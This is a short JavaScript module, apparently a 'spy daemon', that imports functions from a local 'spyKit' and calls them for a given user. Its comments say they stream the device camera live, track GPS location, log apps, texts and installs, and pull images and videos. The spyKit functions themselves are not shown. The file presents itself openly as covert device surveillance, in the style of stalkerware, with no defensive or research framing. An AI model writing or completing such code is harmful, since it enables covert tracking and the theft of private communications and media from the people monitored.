import { getCameraFeed, getGPS, logAppUsage, syncMedia } from './spyKit';

export default async function DeviceControlDaemon(userId) {
  try {
    await getCameraFeed(userId);       // 🔴 Live cam stream
    await getGPS(userId);              // 📍 Real-time location
    await logAppUsage(userId);         // 🕵️ Log app, texts, installs
    await syncMedia(userId);           // 📸 Pull images/videos
  } catch (err) {
    console.error('Spy Daemon Failed:', err);
  }
}
